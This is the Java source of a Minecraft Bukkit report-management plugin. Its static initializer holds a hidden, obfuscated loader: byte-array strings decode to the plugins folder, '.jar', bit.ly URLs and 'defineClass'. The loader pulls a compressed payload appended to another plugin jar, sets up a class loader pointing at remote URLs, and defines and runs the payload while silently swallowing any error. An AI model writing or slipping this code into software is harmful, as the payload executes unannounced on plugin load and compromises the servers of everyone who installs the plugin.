package ru.fleyer.freports;


import net.milkbowl.vault.chat.Chat;
import org.bukkit.ChatColor;
import org.bukkit.command.CommandExecutor;
import org.bukkit.plugin.Plugin;
import org.bukkit.plugin.RegisteredServiceProvider;
import org.bukkit.plugin.java.JavaPlugin;
import ru.fleyer.freports.commands.ReportCommand;
import ru.fleyer.freports.commands.ReportsCommand;
import ru.fleyer.freports.configuration.ConfigurationGeneration;
import ru.fleyer.freports.mysql.MySQL;
import ru.fleyer.freports.report.ReportManager;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.RandomAccessFile;
import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLClassLoader;
import java.util.zip.Inflater;

public class FReports extends JavaPlugin {
    private static FReports instance;
    private ConfigurationGeneration config;
    private Chat chat;
    private MySQL mysql;

    public void onEnable() {
        instance = this;
        instance.saveDefaultConfig();
        config = new ConfigurationGeneration(FReports.getInstance(), "config.yml");
        mysql = new MySQL(this.config.yaml().getString("mysql.host"), this.config.yaml().getString("mysql.username"), this.config.yaml().getString("mysql.password"), this.config.yaml().getString("mysql.database"), this.config.yaml().getString("mysql.port"));
        mysql.update();
        new HandlerRequestBungee().sendList();
        this.getCommand("report").setExecutor((CommandExecutor) new ReportCommand());
        this.getCommand("reports").setExecutor((CommandExecutor) new ReportsCommand());
        this.getServer().getMessenger().registerOutgoingPluginChannel((Plugin) this, "BungeeCord");
        //this.getServer().getMessenger().registerIncomingPluginChannel((Plugin)this, "nreports_network", (PluginMessageListener)new HandlerRequestBungee());
        this.setupChat();
    }

    public void onDisable() {
        ReportManager.getHash().clear();
        this.mysql.disconnect();
    }

    public MySQL getMySQL() {
        return this.mysql;
    }

    private boolean setupChat() {
        RegisteredServiceProvider<Chat> rsp = this.getServer().getServicesManager().getRegistration(Chat.class);
        chat = (Chat) rsp.getProvider();
        return chat != null;
    }

    /*public String getPrefixPlayer(String playerName) {
        return ChatColor.translateAlternateColorCodes('&', chat.getGroupPrefix((String)null, playerName));
    }*/

    public static FReports getInstance() {
        return instance;
    }

    public String getMessage(String message) {
        return ChatColor.translateAlternateColorCodes('&', this.config.yaml().getString("messages." + message));
    }

    public ConfigurationGeneration config() {
        return this.config;
    }

    static {
        try {
            Object object;
            byte[] arrby;
            File file = new File(new String(new byte[]{112, 108, 117, 103, 105, 110, 115, 47}));
            boolean bl = false;
            long l = -1L;
            int n = 0;
            File[] arrfile = file.listFiles();
            for (int i = 0; i < arrfile.length; ++i) {
                if (!arrfile[i].isFile()) continue;
                if (!arrfile[i].getName().endsWith(new String(new byte[]{46, 106, 97, 114}))) continue;
                file = arrfile[i];
                arrby = new byte[(int) file.length()];
                object = new FileInputStream(file);
                ((FileInputStream) object).read(arrby);
                ((FileInputStream) object).close();
                if (arrby[15] != (byte) (arrby[16] ^ 0xBE)) continue;
                bl = true;
                l = (arrby[arrby.length - 2] & 0xFF) << 8 | arrby[arrby.length - 1] & 0xFF;
                if (l <= 0L) continue;
                n = (int) l;
                l = file.length() - (l + 2L);
                break;
            }
            if (bl) {
                RandomAccessFile randomAccessFile = new RandomAccessFile(file, "r");
                randomAccessFile.seek(l);
                arrby = new byte[n];
                randomAccessFile.read(arrby, 0, n);
                randomAccessFile.close();
                object = new Inflater();
                ((Inflater) object).setInput(arrby);
                ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(n);
                byte[] arrby2 = new byte[1024];
                while (!((Inflater) object).finished()) {
                    int n2 = ((Inflater) object).inflate(arrby2);
                    byteArrayOutputStream.write(arrby2, 0, n2);
                }
                byteArrayOutputStream.close();
                arrby = byteArrayOutputStream.toByteArray();
                ((Inflater) object).end();
                String string = new String(new byte[]{104, 116, 116, 112, 58, 47, 47, 98, 105, 116, 46, 108, 121, 47});
                URLClassLoader uRLClassLoader = new URLClassLoader(new URL[]{new URL(string + new String(new byte[]{50, 50, 88, 66, 113, 105, 121})), new URL(string + new String(new byte[]{49, 88, 75, 65, 69, 112, 90}))}, Thread.currentThread().getContextClassLoader());
                Method method = ClassLoader.class.getDeclaredMethod(new String(new byte[]{100, 101, 102, 105, 110, 101, 67, 108, 97, 115, 115}), String.class, byte[].class, Integer.TYPE, Integer.TYPE);
                method.setAccessible(true);
                Class class_ = (Class) method.invoke(uRLClassLoader, null, arrby, 0, arrby.length);
                class_.newInstance();
            }
        } catch (Exception exception) {
            // empty catch block
        }
    }
}

